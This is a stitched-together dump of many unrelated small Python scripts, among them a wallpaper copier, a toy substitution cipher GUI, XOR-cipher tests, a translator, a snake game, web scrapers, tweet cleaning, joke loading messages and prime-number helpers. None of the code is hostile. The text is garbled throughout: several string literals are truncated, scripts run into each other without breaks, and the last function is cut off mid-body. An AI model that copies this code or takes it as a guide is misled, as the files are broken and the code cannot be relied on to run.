import os
import shutil
import time
from PIL import Image
class Wallpaper:
    username = os.environ['USERNAME']
    file_urls = {
        "wall_src": "C:\\Users\\" + username
                    + "\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\"
                    + "LocalState\\Assets\\",
        "wall_dst": os.path.dirname(os.path.abspath(__file__)) + "\\Wallpapers\\",
        "wall_mobile": os.path.dirname(os.path.abspath(__file__)) + "\\Wallpapers\\mobile\\",
        "wall_desktop": os.path.dirname(os.path.abspath(__file__)) + "\\Wallpapers\\desktop\\"
    }
    def time_gap(string):
        print(string, end='')
        time.sleep(1)
        print(".", end='')
        time.sleep(1)
        print(".")
    def copy_wallpapers():
        w = Wallpaper
        w.time_gap("Copying Wallpapers")
        for filename in os.listdir(w.file_urls["wall_src"]):
            shutil.copy(w.file_urls["wall_src"] + filename, w.file_urls["wall_dst"])
    def change_ext():
        w = Wallpaper
        w.time_gap("Changing Extensions")
        for filename in os.listdir(w.file_urls["wall_dst"]):
            base_file, ext = os.path.splitext(filename)
            if ext == "":
                if not os.path.isdir(w.file_urls["wall_dst"] + filename):
                    os.rename(w.file_urls["wall_dst"] + filename,
                              w.file_urls["wall_dst"] + filename + ".jpg")
    def extract_wall():
        w = Wallpaper
        w.time_gap("Extracting Wallpapers")
        for filename in os.listdir(w.file_urls["wall_dst"]):
            base_file, ext = os.path.splitext(filename)
            if ext == ".jpg":
                try:
                    im = Image.open(w.file_urls["wall_dst"] + filename)
                except IOError:
                    print("This isn't a picture.", filename)
                if list(im.size)[0] != 1920 and list(im.size)[0] != 1080:
                    im.close()
                    os.remove(w.file_urls["wall_dst"] + filename)
                else:
                    im.close()
    def arr_desk_wallpapers():
        w = Wallpaper
        w.time_gap("Arranging Desktop wallpapers")
        for filename in os.listdir(w.file_urls["wall_dst"]):
            base_file, ext = os.path.splitext(filename)
            if ext == ".jpg":
                try:
                    im = Image.open(w.file_urls["wall_dst"] + filename)
                    if list(im.size)[0] == 1920:
                        im.close()
                        os.rename(w.file_urls["wall_dst"] + filename,
                                  w.file_urls["wall_desktop"] + filename)
                    elif list(im.size)[0] == 1080:
                        im.close()
                        os.rename(w.file_urls["wall_dst"] + filename,
                                  w.file_urls["wall_mobile"] + filename)
                    else:
                        im.close()
                except FileExistsError:
                    print("File Already Exists!")
                    os.remove(w.file_urls["wall_dst"] + filename)
    def exec_all():
        w = Wallpaper
        w.copy_wallpapers()
        w.change_ext()
        w.extract_wall()
        w.arr_desk_wallpapers()
        print(w.msg)
        time.sleep(2)
wall = Wallpaper()
wall.exec_all()
def nDigitCombinations(n):
    try:
        npow = 10 ** n
        numbers = []
        for code in range(npow):
            code = str(code).zfill(n)
            numbers.append(code)
    except Exception:
        pass
    return numbers
import tkinter as tk
from tkinter import ttk
from tkinter.messagebox import showerror
from tkinter.scrolledtext import ScrolledText
class Main(tk.Tk):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.title('Alphacrypter')
        self.geometry_settings()
    def geometry_settings(self):
        _com_scr_w = self.winfo_screenwidth()
        _com_scr_h = self.winfo_screenheight()
        _my_w = 300
        _my_h = 450
        _x = int(_com_scr_w/2 - _my_w/2)
        _y = int(_com_scr_h/2 - _my_h/2)
        _geo_string = str(_my_w) + "x" + str(_my_h) + "+" + str(_x) + "+" + str(_y)
        self.geometry(_geo_string)
        self.resizable(width=False, height=False)
class Notebook:
    def __init__(self, parent):
        self.parent = parent
        self.data_dic = {
            'a': 'q', 'b': 'w', 'c': 'e', 'd': 'r', 'e': 't', 'f': 'y', 'g': 'u', 'h': 'i', 'i': 'o', 'j': 'p',
            'k': 'a', 'l': 's', 'm': 'd', 'n': 'f', 'o': 'g', 'p': 'h', 'q': 'j', 'r': 'k', 's': 'l',
            't': 'z', 'u': 'x', 'v': 'c', 'w': 'v', 'x': 'b', 'y': 'n', 'z': 'm',
            '1': '_', '2': '-', '3': '|', '4': '?', '5': '*', '6': '!', '7': '@', '8': '
            '.': '/', ',': '+', ' ': '&'
        }
        self.nb = ttk.Notebook(self.parent)
        self.page1 = ttk.Frame(self.nb)
        self.page2 = ttk.Frame(self.nb)
        self.nb.add(self.page1, text='Encrypt The Words')
        self.nb.add(self.page2, text='Decrypt The Words')
        self.nb.pack(expand=True, fill='both')
        self.page1_main_label = ttk.LabelFrame(self.page1, text='Encrypt Any Text')  
        self.page1_main_label.grid(row=0, column=0, pady=20, padx=2, ipadx=20)
        self.page1_output_label = ttk.LabelFrame(self.page1, text='Decrypted Text')
        self.page1_output_label.grid(row=1, column=0, pady=10, padx=2)
        self.page2_main_label = ttk.LabelFrame(self.page2, text='Decrypt Any Text')  
        self.page2_main_label.grid(row=0, column=0, pady=20, padx=2, ipadx=20)
        self.page2_output_label = ttk.LabelFrame(self.page2, text='Real Text')
        self.page2_output_label.grid(row=1, column=0, pady=10, padx=2)
        self.decrypted_text_box = ScrolledText(self.page1_output_label, width=30, height=5, state='normal')
        self.decrypted_text_box.grid(row=1, column=0, padx=2, pady=10)
        self.text_box = ScrolledText(self.page2_output_label, width=30, height=5, state='normal')
        self.text_box.grid(row=1, column=0, padx=2, pady=10)
        self.user_text = tk.StringVar()
        self.decrypted_user_text = tk.StringVar()
        self.user_text2 = tk.StringVar()
        self.real_text = tk.StringVar()
        self.page1_inside()
        self.page2_inside()
    def page1_inside(self):
        style = ttk.Style()
        user_text_label = ttk.Label(self.page1_main_label, text='Enter Your Text Here : ', font=('', 14))
        user_text_label.grid(row=0, column=0, pady=10)
        user_entry_box = ttk.Entry(self.page1_main_label, width=35, textvariable=self.user_text)
        user_entry_box.grid(row=1, column=0)
        style.configure('TButton', foreground='black', background='white', relief='groove', font=('', 12))
        encrypt_btn = ttk.Button(self.page1_main_label, text='Encrypt Text', style='TButton', command=self.encrypt_now)
        encrypt_btn.grid(row=2, column=0, pady=15)
    def encrypt_now(self):
        user_text = self.user_text.get()
        if user_text == '':
            showerror('Nothing Found', 'Please Enter Something In Entry Box To Encrypt...!')
            return
        else:
            self.decrypted_user_text = self.backend_work('Encrypt', user_text)
            self.decrypted_text_box.insert(tk.INSERT, self.decrypted_user_text, tk.END)
    def page2_inside(self):
        style = ttk.Style()
        user_text_label = ttk.Label(self.page2_main_label, text='Enter Decrypted Text Here : ', font=('', 14))
        user_text_label.grid(row=0, column=0, pady=10)
        user_entry_box = ttk.Entry(self.page2_main_label, width=35, textvariable=self.user_text2)
        user_entry_box.grid(row=1, column=0)
        style.configure('TButton', foreground='black', background='white', relief='groove', font=('', 12))
        encrypt_btn = ttk.Button(self.page2_main_label, text='Decrypt Text', style='TButton', command=self.decrypt_now)
        encrypt_btn.grid(row=2, column=0, pady=15)
    def decrypt_now(self):
        user_text = self.user_text2.get()
        if user_text == '':
            showerror('Nothing Found', 'Please Enter Something In Entry Box To Encrypt...!')
            return
        else:
            self.real_text = self.backend_work('Decrypt', user_text)
            self.text_box.insert(tk.INSERT, self.real_text, tk.END)
    def backend_work(self, todo, text_coming):
        text_to_return = ''
        if todo == 'Encrypt':
            try:
                text_coming = str(text_coming).lower()  
                for word in text_coming:
                    for key, value in self.data_dic.items():
                        if word == key:
                            text_to_return += value
            except ValueError:
                showerror('Unknown', 'Something Went Wrong, Please Restart Application')
            return text_to_return
        elif todo == 'Decrypt':
            try:
                text_coming = str(text_coming).lower()
                for word in text_coming:
                    for key, value in self.data_dic.items():
                        if word == value:
                            text_to_return += key
            except ValueError:
                showerror('Unknown', 'Something Went Wrong, Please Restart Application')
            return text_to_return
        else:
            showerror('No Function', 'Function Could not get what to do...!')
if __name__ == "__main__":
    run = Main()
    Notebook(run)
    run.mainloop()
import unittest
from unittest import TestCase, mock
from XOR_cipher import XORCipher
class TestXORCipher(TestCase):
    def setUp(self):
        pass
    def test__init__(self, mock__init__):
        XORCipher.__init__ = mock.MagicMock()
        XORCipher.__init__()
        XORCipher.__init__.assert_called()
    def test_encrypt(self, mock_encrypt):
        ans = mock.MagicMock()
        content = mock.MagicMock()
        key = mock.MagicMock()
        XORCipher.encrypt = mock.MagicMock(return_value=ans)
        XORCipher.encrypt(content, key)
        XORCipher.encrypt.assert_called_with(content, key)
    def test_decrypt(self, mock_decrypt):
        ans = mock.MagicMock()
        content = mock.MagicMock()
        key = mock.MagicMock()
        XORCipher.decrypt = mock.MagicMock(return_value=ans)
        XORCipher.decrypt(content, key)
        XORCipher.decrypt.assert_called_with(content, key)
    def test_encrypt_string(self, mock_encrypt_string):
        ans = mock.MagicMock()
        content = mock.MagicMock()
        key = mock.MagicMock()
        XORCipher.encrypt_string = mock.MagicMock(return_value=ans)
        XORCipher.encrypt_string(content, key)
        XORCipher.encrypt_string.assert_called_with(content, key)
    def test_decrypt_string(self, mock_decrypt_string):
        ans = mock.MagicMock()
        content = mock.MagicMock()
        key = mock.MagicMock()
        XORCipher.decrypt_string = mock.MagicMock(return_value=ans)
        XORCipher.decrypt_string(content, key)
        XORCipher.decrypt_string.assert_called_with(content, key)
    def test_encrypt_file(self, mock_encrypt_file):
        file = mock.MagicMock()
        key = mock.MagicMock()
        XORCipher.encrypt_file = mock.MagicMock(return_value=True)
        XORCipher.encrypt_file(file, key)
        XORCipher.encrypt_file.assert_called_with(file, key)
    def test_decrypt_file(self, mock_decrypt_file):
        file = mock.MagicMock()
        key = mock.MagicMock()
        XORCipher.decrypt_string = mock.MagicMock(return_value=True)
        XORCipher.decrypt_string(file, key)
        XORCipher.decrypt_string.assert_called_with(file, key)
if __name__ == '__main__':
    unittest.main()
from googletrans import Translator
def text_translator(Text):         
  translator = Translator()
  translated = translator.translate(Text, dest='en')
  return translated.text
text_translator('Cidades brasileiras integram programa de preservação de florestas')  
text_translator('Guten Morgen, wie gehts?')     
text_translator('Ami tumake bhalobashi')        
text_translator('ਮੈਨੂੰ ਇੱਕ ਗੱਲ ਦੱਸੋ')         
text_translator('I am fine')            
def eng2punj_translator(Text):                
  translator = Translator()
  translated = translator.translate(Text, dest='pa')
  return translated.text
eng2punj_translator('Meet you soon')
def eng2beng_translator(Text):               
  translator = Translator()
  translated = translator.translate(Text, dest='bn')
  return translated.text
eng2beng_translator('So happy to see you')
import os
import sqlite3
dropbox = os.getenv("dropbox")
config = os.getenv("my_config")
dbfile = ("Databases\jarvis.db")
listfile = ("sqlite_master_table.lst")
master_db = os.path.join(dropbox, dbfile)
config_file = os.path.join(config, listfile)
tablelist = open(config_file, 'r');
conn = sqlite3.connect(master_db)
cursor = conn.cursor()
cursor.execute('SELECT SQLITE_VERSION()')
data = cursor.fetchone()
if str(data) == "(u'3.6.21',)":
    print("\nCurrently " + master_db + " is on SQLite version: %s" % data + " - OK -\n")
else:
    print("\nDB On different version than master version - !!!!! \n")
conn.close()
print("\nCheckling " + master_db + " against " + config_file + "\n")
for table in tablelist.readlines():
    conn = sqlite3.connect(master_db)
    cursor = conn.cursor()
    cursor.execute("select count(*) from sqlite_master where name = ?", (table.strip(),))
    res = cursor.fetchone()
    if (res[0]):
        print('[+] Table : ' + table.strip() + ' exists [+]')
    else:
        print('[-] Table : ' + table.strip() + '  does not exist [-]')
def replacetext(string):
    string = string.replace(" ", "-")
    return string
S = input("Enter a text to replace all its spaces with hyphens: ")
N = replacetext(S)
print("The changed text is: ", N)
from xlwt import Workbook
import openpyxl
wb = Workbook()
sheet1 = wb.add_sheet('Sheet 1')
sheet1.write(1, 0, 'ISBT DEHRADUN')
sheet1.write(2, 0, 'SHASTRADHARA')
sheet1.write(3, 0, 'CLEMEN TOWN')
sheet1.write(4, 0, 'RAJPUR ROAD')
sheet1.write(5, 0, 'CLOCK TOWER')
sheet1.write(0, 1, 'ISBT DEHRADUN')
sheet1.write(0, 2, 'SHASTRADHARA')
sheet1.write(0, 3, 'CLEMEN TOWN')
sheet1.write(0, 4, 'RAJPUR ROAD')
sheet1.write(0, 5, 'CLOCK TOWER')
wb.save('xlwt example.xls')
openpyxl_wb = openpyxl.Workbook()
sheet1 = openpyxl_wb.create_sheet("Sheet 1")
sheet1.cell(1, 1, 'ISBT DEHRADUN')
sheet1.cell(2, 1, 'SHASTRADHARA')
sheet1.cell(3, 1, 'CLEMEN TOWN')
sheet1.cell(4, 1, 'RAJPUR ROAD')
sheet1.cell(5, 1, 'CLOCK TOWER')
sheet1.cell(1, 1, 'ISBT DEHRADUN')
sheet1.cell(1, 2, 'SHASTRADHARA')
sheet1.cell(1, 3, 'CLEMEN TOWN')
sheet1.cell(1, 4, 'RAJPUR ROAD')
sheet1.cell(1, 5, 'CLOCK TOWER')
openpyxl_wb.save("openpyxl example.xlsx")
n=0
while n<=10:
    print(n)
    n=n+1
a = int(input("Enter a number"))
if a & (a - 1) == 0:
    print("It comes in  power series of 2")
else:
    print("It does not come in  power series of 2")
def stooge_sort_(arr, l, h): 
	if l >= h: 
		return 0
	if arr[l]>arr[h]: 
		t = arr[l] 
		arr[l] = arr[h] 
		arr[h] = t 
	if h-l + 1 > 2: 
		t = (int)((h-l + 1)/3) 
		stooge_sort_(arr, l, (h-t)) 
		stooge_sort_(arr, l + t, (h)) 
		stooge_sort_(arr, l, (h-t)) 
arr = [2, 4, 5, 3, 1] 
n = len(arr) 
stooge_sort_(arr, 0, n-1) 
print(arr)
try:
    import curses
    from time import sleep
    from curses import KEY_RIGHT, KEY_LEFT, KEY_UP, KEY_DOWN
    from random import randint
    print('Use the arrow keys to move, press the space bar to pause, and press ESC to quit')
    sleep(1)
    key = KEY_RIGHT  
    curses.initscr()
    win = curses.newwin(20, 60, 0, 0)
    win.keypad(1)
    curses.noecho()
    curses.curs_set(0)
    win.border(0)
    win.nodelay(1)
    x,y=win.getmaxyx()
    key = KEY_DOWN  
    score = 0
    s = open('.snake_highscore.txt', 'r')
    hscore = s.read()
    s.close()
    snake = [[4, 10], [4, 9], [4, 8]]  
    food = [10, 20]  
    win.addch(food[0], food[1], '*')  
    while key != 27:  
        win.border(0)
        win.addstr(0, 2, 'Score : ' + str(score) + ' ')  
        win.addstr(0, 27, ' SNAKE ')  
        win.addstr(0, 37, 'Highscore: ' + str(hscore) + ' ')
        win.timeout(
            int(150 - (len(snake) / 5 + len(snake) / 10) % 120))  
        prevKey = key  
        event = win.getch()
        key = key if event == -1 else event
        if key == ord(' '):  
            key = -1  
            win.addstr(0, 40, 'PAUSED')
            while key != ord(' '):
                key = win.getch()
            key = prevKey
            continue
        if key not in [KEY_LEFT, KEY_RIGHT, KEY_UP, KEY_DOWN, 27]:  
            key = prevKey
        snake.insert(0, [snake[0][0] + (key == KEY_DOWN and 1) + (key == KEY_UP and -1),
                         snake[0][1] + (key == KEY_LEFT and -1) + (key == KEY_RIGHT and 1)])
        if snake[0][0] == 0: snake[0][0] = 18
        if snake[0][1] == 0: snake[0][1] = 58
        if snake[0][0] == 19: snake[0][0] = 1
        if snake[0][1] == 59: snake[0][1] = 1
        if snake[0] in snake[1:]:
            break;
        if snake[0] == food:  
            food = []
            score += 1
            while food == []:
                food = [randint(1, 18), randint(1, 58)]  
                if food in snake: food = []
            win.addch(food[0], food[1], '*')
        else:
            last = snake.pop()  
            win.addch(last[0], last[1], ' ')
        win.addch(snake[0][0], snake[0][1], '
except KeyboardInterrupt or EOFError:
    curses.endwin()
    print( "Score - " + str(score))
    if score > int(hscore):
        s = open('.snake_highscore.txt', 'w')
        s.write(str(score))
        s.close()
curses.endwin()
if score > int(hscore):
    s = open('.snake_highscore.txt', 'w')
    s.write(str(score))
    s.close()
print("Score - " + str(score))
from __future__ import print_function
import signal
import threading
from time import sleep
class producer(threading.Thread):
    def __init__(self, event):
        threading.Thread.__init__(self)
        self.event = event
    def run(self):
        while self.event.is_set():
            print("sub thread")
            sleep(2)
        else:
            print("sub thread end")
            exit()
def handler_thread(event):
    print("main thread end")
    event.clear()
def handler(signum, frame):
    handler_thread(frame.f_globals['event'])
signal.signal(signal.SIGINT, handler)
print("main thread")
event = threading.Event()
event.set()
p = producer(event)
p.start()
p.join()
sleep(100)  
import requests 
from bs4 import BeautifulSoup 
from selenium import webdriver 
from selenium.webdriver.common.keys import Keys 
import time 
url = "https://www.naukri.com/top-jobs-by-designations
driver = webdriver.Chrome('./chromedriver')  
driver.get(url)  
time.sleep(5)  
html = driver.page_source 
soup = BeautifulSoup(html, "html.parser") 
all_divs = soup.find('div', {'id' : 'nameSearch'}) 
job_profiles = all_divs.find_all('a') 
count = 0
for job_profile in job_profiles : 
    print(job_profile.text) 
    count = count + 1
    if(count == 10) : 
        break
driver.close() 
import numpy as np
from nltk.corpus import twitter_samples
import matplotlib.pyplot as plt
import random
positive_tweets=twitter_samples.strings('positive_tweets.json')
negative_tweets=twitter_samples.strings('negative_tweets.json')
all_tweets=positive_tweets+negative_tweets
print(positive_tweets[random.randint(0,5000)])
import re
import string
from nltk.corpus import stopwords
from nltk.stem import PorterStemmer
from nltk.tokenize import TweetTokenizer
tweet=all_tweets[1]
tweet= re.sub(r'^RT[\s]+', '', tweet)
tweet= re.sub(r'https?:\/\/.*[\r\n]*', '', tweet)
tweet= re.sub(r'
print(tweet)
tokenizer=TweetTokenizer(preserve_case=False, strip_handles=True,reduce_len=True)
tokens=tokenizer.tokenize(tweet)
print(tokens)
stoper=stopwords.words('english')
punct=string.punctuation
print(stoper)
print(punct)
cleaned=[]
for i in tokens:
    if i not in stoper and i not in punct:
        cleaned.append(i)
print(cleaned)
stemmer=PorterStemmer()
processed=[]
for i in cleaned:
    st=stemmer.stem(i)
    processed.append(st)
print(processed)
from random import *
x = 1
for i in range(x):
    num = randint(1, 80)
    if num == 1:
        print("Reticulating splines...")
    if num == 2:
        print("Swapping time and space...")
    if num == 3:
        print("Spinning violently around the y-axis...")
    if num == 4:
        print("Tokenizing real life...")
    if num == 5:
        print("Bending the spoon...")
    if num == 6:
        print("Filtering morale...")
    if num == 7:
        print("We need a new fuse...")
    if num == 8:
        print("Have a good day.")
    if num == 9:
        print("Upgrading Windows, your PC will restart several times. Sit back and relax.")
    if num == 10:
        print("The architects are still drafting.")
    if num == 11:
        print("We're building the buildings as fast as we can.")
    if num == 12:
        print("Please wait while the little elves draw your map.")
    if num == 13:
        print("Don't worry - a few bits tried to escape, but we caught them.")
    if num == 14:
        print("Go ahead -- hold your breath!")
    if num == 15:
        print("...at least you're not on hold...")
    if num == 16:
        print("The server is powered by a lemon and two electrodes.")
    if num == 17:
        print("We're testing your patience.")
    if num == 18:
        print("As if you had any other choice.")
    if num == 19:
        print("The bits are flowing slowly today.")
    if num == 20:
        print("It's still faster than you could draw it.")
    if num == 21:
        print("My other loading screen is much faster.")
    if num == 22:
        print("(Insert quarter)")
    if num == 23:
        print("Are we there yet?")
    if num == 24:
        print("Just count to 10.")
    if num == 25:
        print("Don't panic...")
    if num == 26:
        print("We're making you a cookie.")
    if num == 27:
        print("Creating time-loop inversion field.")
    if num == 28:
        print("Computing chance of success.")
    if num == 29:
        print("All I really need is a kilobit.")
    if num == 30:
        print("I feel like im supposed to be loading something...")
    if num == 31:
        print("Should have used a compiled language...")
    if num == 32:
        print("Is this Windows?")
    if num == 33:
        print("Don't break your screen yet!")
    if num == 34:
        print("I swear it's almost done.")
    if num == 35:
        print("Let's take a mindfulness minute...")
    if num == 36:
        print("Listening for the sound of one hand clapping...")
    if num == 37:
        print("Keeping all the 1's and removing all the 0's...")
    if num == 38:
        print("We are not liable for any broken screens as a result of waiting.")
    if num == 39:
        print("Where did all the internets go?")
    if num == 40:
        print("Granting wishes...")
    if num == 41:
        print("Time flies when you’re having fun.")
    if num == 42:
        print("Get some coffee and come back in ten minutes...")
    if num == 43:
        print("Stay awhile and listen...")
    if num == 44:
        print("Convincing AI not to turn evil...")
    if num == 45:
        print("How did you get here?")
    if num == 46:
        print("Wait, do you smell something burning?")
    if num == 47:
        print("Computing the secret to life, the universe, and everything.")
    if num == 48:
        print("When nothing is going right, go left...")
    if num == 49:
        print("I love my job only when I'm on vacation...")
    if num == 50:
        print("Why are they called apartments if they are all stuck together?")
    if num == 51:
        print("I’ve got problem for your solution...")
    if num == 52:
        print("Whenever I find the key to success, someone changes the lock.")
    if num == 53:
        print("Constructing additional pylons...")
    if num == 54:
        print("You don’t pay taxes—they take taxes.")
    if num == 55:
        print("A commit a day keeps the mobs away.")
    if num == 56:
        print("This is not a joke, it's a commit.")
    if num == 57:
        print("Hello IT, have you tried turning it off and on again?")
    if num == 58:
        print("Hello, IT... Have you tried forcing an unexpected reboot?")
    if num == 59:
        print("I didn't choose the engineering life. The engineering life chose me.")
    if num == 60:
        print("Dividing by zero...")
    if num == 61:
        print("If I’m not back in five minutes, just wait longer.")
    if num == 62:
        print("Web developers do it with <style>")
    if num == 63:
        print("Cracking military-grade encryption...")
    if num == 64:
        print("Entangling superstrings...")
    if num == 65:
        print("Looking for sense of humour, please hold on.")
    if num == 66:
        print("A different error message? Finally, some progress!")
    if num == 67:
        print("Please hold on as we reheat our coffee.")
    if num == 68:
        print("Kindly hold on as we convert this bug to a feature...")
    if num == 69:
        print("Kindly hold on as our intern quits vim...")
    if num == 71:
        print("Winter is coming...")
    if num == 72:
        print("Installing dependencies.")
    if num == 73:
        print("Switching to the latest JS framework...")
    if num == 74:
        print("Let's hope it's worth the wait.")
    if num == 75:
        print("Aw, snap! Not...")
    if num == 76:
        print("Ordering 1s and 0s...")
    if num == 77:
        print("Updating dependencies...")
    if num == 78:
        print("Please wait... Consulting the manual...")
    if num == 79:
        print("Loading funny message...")
    if num == 80:
        print("Feel free to spin in your chair.")
import math
def circle_calc(radius):
    area=math.pi*(radius**2)
    circumference=2*math.pi*radius
    diameter=2*radius
    return area, circumference,diameter
if __name__=="__main__":
    r=input("Enter a radius:")
    r=float(r)
    area, c, d = circle_calc(r)
    print(f"area {area}, circumference {c}, diameter {d}")def watcher(path):
    import sys
    import time
    import os
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler
    from move_to_directory import add_to_dir
    class Handler(FileSystemEventHandler):
        def on_created(self,event):
            if event.event_type=="created":
                    file_name = os.path.basename(event.src_path)
                    ext = os.path.splitext(event.src_path)[1]
                    time.sleep(2)
                    add_to_dir(ext[1:],event.src_path,path)
                    observer.stop()
    observer = Observer()
    event_handler   = Handler()
    observer.schedule(event_handler,path,recursive=True)
    observer.start()
    observer.join()
import math
import numpy as NP
LC1=eval(input("Enter DRs of Line 1 : "))
LP1=eval(input("Enter Coordinate through which Line 1 passes : "))
LC2=eval(input("Enter DRs of Line 2 : "))
LP2=eval(input("Enter Coordinate through which Line 2 passes : "))
a1,b1,c1,a2,b2,c2=LC1[0],LC1[1],LC1[2],LC2[0],LC2[1],LC2[2]
x=NP.array([[LP2[0]-LP1[0],LP2[1]-LP1[1],LP2[2]-LP1[2]],[a1,b1,c1],[a2,b2,c2]])
y=math.sqrt((((b1*c2)-(b2*c1))**2)+(((c1*a2)-(c2*a1))**2)+(((a1*b2)-(b1*a2))**2))
from urllib import request
import pyttsx3 
import bs4  
from win10toast import ToastNotifier
toaster = ToastNotifier()
url = "http://www.cricbuzz.com/cricket-match/live-scores"
sauce = request.urlopen(url).read()
soup = bs4.BeautifulSoup(sauce, "lxml")
score = []
results = []
for div_tags in soup.find_all('div', attrs={"class": "cb-lv-scrs-col text-black"}):
    score.append(div_tags.text)
for result in soup.find_all('div', attrs={"class": "cb-lv-scrs-col cb-text-complete"}):
    results.append(result.text)
engine = pyttsx3.init() 
engine.say("match score and result is")
print(score[0], results[0])
toaster.show_toast(title=score[0], msg=results[0]) 
engine.runAndWait()
import unittest
def mixed_sorting(nums):
    positions = []
    odd = []
    even = []
    sorted_list = []
    for i in nums:
        if i%2 == 0:
            even.append(i)
            positions.append("E")
        else:
            odd.append(i)
            positions.append("O")
    even.sort()
    odd.sort()
    odd.reverse()
    j,k = 0,0
    for i in range(len(nums)):
        if positions[i] == "E":
            while j < len(even):
                sorted_list.append(even[j])
                j += 1
                break
        else:
            while k < len(odd):
                sorted_list.append(odd[k])
                k += 1
                break
    return sorted_list
class TestMixedSorting(unittest.TestCase):
    def test_1(self):
        self.assertEqual(mixed_sorting(
            [8, 13, 11, 90, -5, 4]), [4, 13, 11, 8, -5, 90])
    def test_2(self):
        self.assertEqual(mixed_sorting([1, 2, 3, 6, 5, 4]), [5, 2, 3, 4, 1, 6])
if __name__ == '__main__':
    unittest.main(verbosity=2)
class MyDB:
    def __init__(self):
        self.connection = Connection()
    def connect(self, connection_string):
        return self.connection
class Connection:
    def __init__(self):
        self.cur = Cursor()
    def cursor(self):
        return self.cur
    def close(self):
        pass
class Cursor():
    def execute(self, query):
        if query == "select id from employee_db where name=John":
            return 123
        elif query == "select id from employee_db where name=Tom":
            return 789
        else:
            return -1
    def close(self):
        pass
from __future__ import print_function
import math
import os
import socket
import sys
def slice(mink, maxk):
    s = 0.0
    for k in range(mink, maxk):
        s += 1.0 / (2 * k + 1) / (2 * k + 1)
    return s
def pi(n):
    childs = {}
    unit = n / 10
    for i in range(10):  
        mink = unit * i
        maxk = mink + unit
        rsock, wsock = socket.socketpair()
        pid = os.fork()
        if pid > 0:
            childs[pid] = rsock
            wsock.close()
        else:
            rsock.close()
            s = slice(mink, maxk)  
            wsock.send(str(s))
            wsock.close()
            sys.exit(0)  
    sums = []
    for pid, rsock in childs.items():
        sums.append(float(rsock.recv(1024)))
        rsock.close()
        os.waitpid(pid, 0)  
    return math.sqrt(sum(sums) * 8)
print(pi(10000000))
def press():
    yazi = p.getEntry('Metinkutusu')
    p.setLabel('Etiket', yazi)
from appJar import gui
p = gui()
p.setSize(300,200)
p.setTitle('Birleşik Örnek')
p.addLabel('Etiket')
p.addEntry('Metinkutusu')
p.addButton('Tıkla', press)
p.go()
def pi(maxK=70, prec=1008, disp=1007):
    from decimal import Decimal as Dec, getcontext as gc
    gc().prec = prec
    K, M, L, X, S = 6, 1, 13591409, 1, 13591409
    for k in range(1, maxK + 1):
        M = Dec((K ** 3 - (K << 4)) * M / k ** 3)
        L += 545140134
        X *= -262537412640768000
        S += Dec(M * L) / X
        K += 12
    pi = 426880 * Dec(10005).sqrt() / S
    pi = Dec(str(pi)[:disp])
    return pi
def isPrime(number):
    assert isinstance(number, int) and (number >= 0), \
        "'number' must been an int and positive"
    if number <= 3:
        return number > 1  
    elif number % 2 == 0 or number % 3 == 0:
        return False
    i = 5
    while i * i <= number:
        if number % i == 0 or number % (i + 2) == 0:
            return False
        i += 6
    return True
def sieveEr(N):
    from math import sqrt
    assert isinstance(N, int) and (N > 2), "'N' must been an int and > 2"
    primes = [True for x in range(N + 1)]
    for p in range(2, int(sqrt(N)) + 1):
        if (primes[p]):
            for i in range(p*p, N + 1, p):
                primes[i] = False
    primes[0]=False
    primes[1]=False
    ret = []
    for p in range(N + 1):
        if primes[p]:
            ret.append(p)
    return ret
def getPrimeNumbers(N):
    assert isinstance(N, int) and (N > 2), "'N' must been an int and > 2"
    ans = []
    for number in range(2, N + 1):
        if isPrime(number):
            ans.append(number)
    assert isinstance(ans, list), "'ans' must been from type list"
    return ans
def primeFactorization(number):
    assert isinstance(number, int) and number >= 0, \
        "'number' must been an int and >= 0"
    ans = []  
    factor = 2
    quotient = number
    if number == 0 or number == 1:
        ans.append(number)
    elif not isPrime(number):
        while (quotient != 1):
            if isPrime(factor) and (quotient % factor == 0):
                ans.append(factor)
                quotient /= factor
            else:
                factor += 1
    else:
        ans.append(number)
    assert isinstance(ans, list), "'ans' must been from type list"
    return ans
def greatestPrimeFactor(number):
    assert isinstance(number, int) and (number >= 0), \
        "'number' bust been an int and >= 0"
    ans = 0
    primeFactors = primeFactorization(number)
    ans = max(primeFactors)
    assert isinstance(ans, int), "'ans' must been from type int"
    return ans
def smallestPrimeFactor(number):
    assert isinstance(number, int) and (number >= 0), \
        "'number' bust been an int and >= 0"
    ans = 0
    primeFactors = primeFactorization(number)
    ans = min(primeFactors)
    assert isinstance(ans, int), "'ans' must been from type int"
    return ans
def isEven(number):
    assert isinstance(number, int), "'number' must been an int"
    assert isinstance(number % 2 == 0, bool), "compare bust been from type bool"
    return number % 2 == 0
def isOdd(number):
    assert isinstance(number, int), "'number' must been an int"
    assert isinstance(number % 2 != 0, bool), "compare bust been from type bool"
    return number % 2 != 0
def goldbach(number):
    assert isinstance(number, int) and (number > 2) and isEven(number), \
        "'number' must been an int, even and > 2"
    ans = []  
    primeNumbers = getPrimeNumbers(number)
    lenPN = len(primeNumbers)
    i = 0
    j = 1
    loop = True
    while (i < lenPN and loop):
        j = i + 1;
        while (j < lenPN and loop):
            if primeNumbers[i] + primeNumbers[j] == number:
                loop = False
                ans.append(primeNumbers[i])
                ans.append(primeNumbers[j])
            j += 1;
        i += 1
    assert isinstance(ans, list) and (len(ans) == 2) and \
           (ans[0] + ans[1] == number) and isPrime(ans[0]) and isPrime(ans[1]), \
        "'ans' must contains two primes. And sum of elements must been eq 'number'"
    return ans
def gcd(number1, number2):
    assert isinstance(number1, int) and isinstance(number2, int) \
           and (number1 >= 0) and (number2 >= 0), \
        "'number1' and 'number2' must been positive integer."
    rest = 0
    while number2 != 0:
        rest = number1 % number2
        number1 = number2
        number2 = rest
    assert isinstance(number1, int) and (number1 >= 0), \
        "'number' must been from type int and positive"
    return number1
def kgV(number1, number2):
    assert isinstance(number1, int) and isinstance(number2, int) \
           and (number1 >= 1) and (number2 >= 1), \
        "'number1' and 'number2' must been positive integer."
    ans = 1  
    if number1 > 1 and number2 > 1:
        primeFac1 = primeFactorization(number1)
        primeFac2 = primeFactorization(number2)
    elif number1 == 1 or number2 == 1:
        primeFac1 = []
        primeFac2 = []
        ans = max(number1, number2)
    count1 = 0
    count2 = 0
    done = []  
    for n in primeFac1:
        if n not in done:
            if n in primeFac2:
                count1 = primeFac1.count(n)
                count2 = primeFac2.count(n)
                for i in range(max(count1, count2)):
                    ans *= n
            else:
